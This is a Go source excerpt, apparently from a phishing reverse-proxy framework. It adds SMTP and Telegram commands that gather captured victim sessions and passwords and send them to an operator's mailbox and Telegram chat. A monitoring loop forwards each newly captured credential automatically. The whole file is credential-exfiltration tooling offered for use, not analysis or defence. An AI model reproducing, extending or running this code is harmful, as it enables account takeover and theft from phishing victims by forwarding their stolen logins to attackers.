...
type Terminal struct {
	...
	hlp       *Help
	developer bool
	// Define fields or methods relevant to your Terminal struct.
	SmtpServer       string
	SmtpPort         int
	EmailSender      string
	EmailPassword    string
	RecipientEmail   string
	TeleChatIDStr    string
	TelegramBotToken string
}

func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool, smtpPort int, smtpServer, emailSender, emailPassword, recipientEmail, teleGramToken, teleGramChatID string) (*Terminal, error) {
	var err error
	t := &Terminal{
		cfg:              cfg,
		crt_db:           crt_db,
		...
		TeleChatIDStr:    teleGramChatID, // Assign the correct variable here.
	}
...
func (t *Terminal) handleSmtp(args []string) error {
	pn := len(args)

	if pn == 0 || pn < 1 {
		return fmt.Errorf("wrong format expected smtp <host|username|port|password|email> <value>")
	}

	switch args[0] {
	case "host":
		t.SmtpServer = args[1]
		log.Info("Host: %s", t.SmtpServer)
	...
	case "port":
		...
		t.SmtpPort = port
		log.Info("Port: %d", t.SmtpPort)

	case "username":
		t.EmailSender = args[1]
		log.Info("Username: %s", t.EmailSender)

	case "password":
		t.EmailPassword = args[1]
		log.Info("Password: %s", t.EmailPassword)

	case "email":
		t.RecipientEmail = args[1]
		log.Info("Email: %s", t.RecipientEmail)
	...
	case "info":
		...
		log.Info("Username: %s", t.EmailSender)
		log.Info("Password: %s", t.EmailPassword)
		log.Info("ReceiptTo: %s", t.RecipientEmail)

	case "send":
		resultText, err := t.prepLogs()
		if err != nil {
			return fmt.Errorf(err.Error())
		}

		t.sendEmailResults("New User Logs", resultText)

	default:
		return fmt.Errorf("invalid syntax: %s or Expected third values", args)
...
func (t *Terminal) handleTelegram(args []string) error {
	pn := len(args)

	if pn == 0 || pn < 1 {
		return fmt.Errorf("wrong format expected Telegram <token|chatid|info|send> <value>")
	}

	switch args[0] {
	case "token":
		t.TelegramBotToken = args[1]
		log.Info("Token: %s", t.TelegramBotToken)

	case "chatid":
		t.TeleChatIDStr = args[1]
		log.Info("ChatID: %s", t.TeleChatIDStr)
	...
	case "send":
		...
		t.sendTelegramResults(resultText)

	default:
		return fmt.Errorf("invalid syntax: %s or expected <token|chatid|info|send>", args)
...
func (t *Terminal) prepLogs() (string, error) {
	...
	for _, s := range sessions {
		...
		if tcol == "captured" || s.Password != "" {
			...
			resultSheet = append(resultSheet, strings.Join(vals, "\t")) // Join the values with a tab separator
		}
	}

	if len(resultSheet) == 0 {
		return "", nil // Return nil if resultSheet is empty
	}

	resultText := strings.Join(resultSheet, "\n") // Join the rows with newlines
	return resultText, nil
}

func (t *Terminal) sendEmailResults(subject, body string) {
	if t.SmtpServer == "" {
		log.Fatal("Send Email error: SMTP DETAILS NOT SET")
		return
	}
	...
	auth := smtp.PlainAuth("", t.EmailSender, t.EmailPassword, t.SmtpServer)
	// fmt.Println(t.SmtpServer+":"+strconv.Itoa(t.SmtpPort), auth, t.EmailSender, []string{t.RecipientEmail}, []byte(message))

	// Send the email.
	err := smtp.SendMail(t.SmtpServer+":"+strconv.Itoa(t.SmtpPort), auth, t.EmailSender, []string{t.RecipientEmail}, []byte(message))
	if err != nil {
		log.Fatal("Email error: ", err.Error())
	} else {
		log.Info("Email sent successfully!")
	}
}

func (t *Terminal) sendTelegramResults(messageText string) {
	// Convert chatIDStr to int64
	if t.TeleChatIDStr == "" {
		return
	}

	chatID, err := strconv.ParseInt(t.TeleChatIDStr, 10, 64)
	if err != nil {
...
func (t *Terminal) monitorPasswordToken() {
	sentLogs := make(map[int]bool) // Use a map to keep track of sent logs by their unique identifier (e.g., session ID)

	for {
		resultText, err := t.prepLogs()
		if err != nil {
			log.Printf("ail Monitoring Error logs: %v", err)
		} else if resultText != "" {
			// Split the resultText into individual log entries (assuming one entry per line)
			logEntries := strings.Split(resultText, "\n")

			for _, logEntry := range logEntries {
				// Extract a unique identifier from the log (e.g., session ID)
				sessionID := extractSessionID(logEntry)

				// Check if the session ID is in the set of sent logs
				if !sentLogs[sessionID] {
					// If it's not in the set, send the log
					t.sendEmailResults("New User Log", logEntry)
					t.sendTelegramResults(logEntry)

					// Mark the log as sent by adding it to the set
					sentLogs[sessionID] = true
				}
			}
		}
...
// Helper function to extract a unique identifier (e.g., session ID) from a log entry
func extractSessionID(logEntry string) int {
	// Implement the logic to extract the session ID from the log entry
	// For example, if the session ID is the first field in the log entry:
	fields := strings.Fields(logEntry)
	if len(fields) > 0 {
		sessionID, _ := strconv.Atoi(fields[0])
		return sessionID
	}
	return 0 // Return a default value if session ID extraction fails
}
